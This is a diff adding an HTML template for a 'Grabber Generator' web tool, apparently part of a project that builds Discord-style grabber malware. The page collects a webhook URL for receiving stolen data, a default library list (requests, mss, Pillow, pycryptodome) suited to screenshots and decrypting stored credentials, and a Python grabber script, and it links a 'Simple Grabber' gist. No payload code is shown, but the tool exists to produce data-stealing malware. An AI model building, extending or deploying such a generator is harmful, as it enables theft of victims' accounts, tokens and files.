@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Project Neon - GrabberGenerator</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css2?family=Russo+One&display=swap" rel="stylesheet">
+    <link href="static/style.css" rel="stylesheet">
+</head>
+<body>
+    <div class="bg"></div>
+    <div class="container">
+        <header class="header">
+            <div class="notification">
+                <img src="static/discordLogo.svg" class="notification-icon">
+                <span class="notification-count" id="notificationCount">0</span>
+            </div>
+            <h1 class="title">Grabber Generator</h1>
+            <ul class="nav">
+                <li><a href="/tools">Tools</a></li>
+            </ul>
+        </header>
+        <div class="content">
+            {% if error %}
+            <p class="text-danger">{{ error | safe }}</p>
+            {% elif success %}
+            <p class="text-success">{{ success }}</p>
+            {% endif %}
+            <p>The created Grabber will be sent to the Webhook URL entered.</p>
+            <div class="row">
+                <div class="col-md-6">
+                    <form method="post" class="mb-3" id="form" accept-charset="UTF-8">
+                        <div class="mb-2">
+                            <label for="webhookUrl">WebHook URL</label>
+                            <input type="text" class="form-control" id="webhookUrl" name="webhookUrl" required>
+                        </div>
+                        <div class="mb-2">
+                            <label for="libraries">List of libraries used (comma separated)</label>
+                            <input type="text" class="form-control" id="libraries" name="libraries" value="requests,mss,Pillow,pycryptodome" required>
+                        </div>
+                        <div class="mb-2">
+                            <label for="script">Python script (changes are for developers) (constant name for WebhookURL is "WEBHOOK_URL")<a href="https://gist.github.com/stsaria/d8315583d76f2b70ce132c106f61e852">Simple Grabber</a>:</label>
+                            <textarea class="form-control" id="script" name="script" rows="20"></textarea>
+                        </div>
+                        <button type="submit" id="submit" class="btn btn-primary">
+                            <span class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
+                            Generate
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        document.getElementById('form').addEventListener('submit', function(event) {
+            var webhookUrlInput = document.getElementById("webhookUrl");
+            var librariesInput = document.getElementById("libraries");
+            var scriptInput = document.getElementById("script");
+            var submitButton = document.getElementById("submit");
+            webhookUrlInput.readOnly = librariesInput.readOnly = scriptInput.readOnly = true;
+            submitButton.disabled = true;
+            var spinner = this.querySelector('.spinner-border');
+            spinner.classList.remove('d-none');
+        });
+
+        let count = 0;
+        const notificationCount = document.getElementById('notificationCount');
+
+        setInterval(() => {
+            count = (count + 1) % 201; // 200を超えたらリセット
+            notificationCount.textContent = count;
+        }, 50);
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz" crossorigin="anonymous"></script>
+</body>
+</html>
